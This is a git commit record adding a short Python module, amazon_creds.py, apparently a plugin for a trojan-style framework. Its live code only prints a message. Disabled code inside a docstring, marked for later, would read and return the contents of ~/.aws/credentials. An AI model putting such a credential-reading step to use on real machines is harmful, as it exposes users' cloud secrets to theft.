adc4aea21a44eb6ed8710ca276b43f3235f231ad
exiett <exiett@aol.com>
2023-02-09 21:18:34 -0300

    adding some salsa

---
+++ modules/amazon_creds.py
@@ -0,0 +1,10 @@
+import os
+
+def run(**args):
+    print("[*] In AWS module.")
+    """
+    WE WILL DO THIS LATER! =)
+    with open('~/.aws/credentials') as f:
+        lines = f.readlines()
+    return lines
+    """
